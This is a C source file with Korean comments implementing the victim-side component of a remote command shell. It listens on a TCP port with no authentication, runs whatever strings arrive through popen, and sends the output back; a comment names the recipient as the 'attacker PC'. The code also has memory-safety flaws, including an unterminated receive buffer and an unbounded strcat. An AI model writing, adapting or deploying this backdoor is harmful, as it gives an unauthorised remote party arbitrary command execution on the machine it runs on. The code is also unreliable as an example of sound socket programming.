#include "Target.h"
#define MAX_PTR 4096

void* TCP_Server(){
	int sock, client_sock, addr_len, recv_len;
	pid_t pid;
	struct sockaddr_in addr, client_addr;

	// 소켓 생성
	sock = Set_Socket();
	
	// 소켓 정보 생성
	memset(&addr, 0x00, sizeof(addr));
	addr.sin_family = PF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(PORT);

	if(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
		perror("bind");
		exit(0);
	}

	sock = Wait_Client(sock);
	addr_len = sizeof(client_sock);

	client_sock = accept(sock, (struct sockaddr*)&client_addr, &addr_len);

	// commend를 받는 함수
	Recv_Commend(client_sock);
	printf("program end...\n");
	sleep(3);
	close(client_sock);
	close(sock);

}


int Set_Socket(){ // socket() 함수
	int sock;	
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		return 0;
	}
	return sock;
}

int Wait_Client(int sock){	// listen 함수
	if(listen(sock, 5) < 0){
		perror("listen");
		return 0;
	}	
	return sock;
}

void Str_processing(char* commend, char** argv){
	int i = 0;
	char* token;
	
	token = strtok(commend, " ");
	while(token != NULL){
		argv[i] = token;
		token = strtok(NULL, " ");
		i++;
	}
}

int Recv_Commend(int client_sock){
	char commend[MAX_STR];	
	int recv_len;
	int pid;
	
	while(client_sock){
		int i = 0;
		char tmp_str[MAX_PTR] = "";
		char print_send[MAX_PTR];
		FILE *fd;
		
		recv_len = recv(client_sock, commend, sizeof(commend), 0);
		if(recv_len < 0){ 
			perror("recv");
			exit(0);
		}
		
		// 
		if((!strcmp(commend, "q"))){
			break;
		}
		
		// 파이프를 열어서 명령어 실행 시 출력물을 읽어옴
		fd = popen(commend, "r");
		if(fd == NULL){
			perror("popen");
		}
		
		// 출력값을 fgets로 print_send변수에 저장
		while(fgets(print_send, sizeof(print_send), fd) != NULL){
			strcat(tmp_str, print_send);
		}
		
		// 출력값을 공격자PC로 보냄
		if(send(client_sock, (char*)tmp_str, sizeof(tmp_str), 0) < 0){
			perror("send");
		}
		pclose(fd);

		
	}
	return 0;
}

void Clear_Terminal(){
	execl("/usr/bin/clear", "clear", NULL);
}

void End_Process(){
	pid_t pid = fork();
	if(pid > 0){
		printf("Socket Clear Please Wait.....\n");
	}else if(pid == 0){
		Clear_Terminal();
	}else{
		printf("fork() error....\n");
	}
	
	sleep(1);
}


/*******
파이프 함수를 사용하기 전에 만들었던 함수
execvp를 이용하여 명령어 실행
하지만 타겟pc 화면에 출력되고 공격자pc로 결과값을 보내기가
까다로워 파이프 함수를 사용하게 됨.

char* Execute_Commend(char** argv){
	char* commend_print;
	
	if(execvp(argv[0], argv) == -1){
		perror("execvp");
		exit(0);
	}
	return commend_print;
}
********/


